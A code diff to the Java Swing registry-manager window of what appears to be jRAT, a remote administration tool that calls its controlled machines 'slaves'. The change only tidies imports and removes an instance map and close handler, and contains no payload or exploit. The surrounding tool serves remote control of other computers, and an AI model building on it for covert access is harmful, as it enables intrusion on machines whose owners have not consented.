@@ -15,14 +15,13 @@ import jrat.module.registry.PacketQuery;
 import javax.swing.*;
 import javax.swing.tree.TreePath;
 import java.awt.*;
-import java.awt.event.*;
-import java.util.HashMap;
-import java.util.Map;
+import java.awt.event.ActionEvent;
+import java.awt.event.ActionListener;
+import java.awt.event.MouseAdapter;
+import java.awt.event.MouseEvent;
 
 @SuppressWarnings("serial")
 public class FrameRemoteRegistry extends BaseFrame {
-
-    public static final Map<Slave, FrameRemoteRegistry> INSTANCES = new HashMap<Slave, FrameRemoteRegistry>();
 
     private final ImageIcon ICON_REGSZ = Resources.getIcon("registry-string");
     private final ImageIcon ICON_REG01 = Resources.getIcon("registry-bin");
@@ -50,13 +49,7 @@ public class FrameRemoteRegistry extends BaseFrame {
 
     public FrameRemoteRegistry(Slave s) {
         super(s);
-        addWindowListener(new WindowAdapter() {
-            @Override
-            public void windowClosing(WindowEvent arg0) {
-                exit();
-            }
-        });
-        INSTANCES.put(slave, this);
+
         setTitle("Registry Manager");
         setIconImage(Resources.getIcon("registry").getImage());
         setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
@@ -271,10 +264,6 @@ public class FrameRemoteRegistry extends BaseFrame {
 
     public void execute(String location) {
         slave.addToSendQueue(new PacketQuery(location));
-    }
-
-    public void exit() {
-        INSTANCES.remove(slave);
     }
 
     public void clear() {
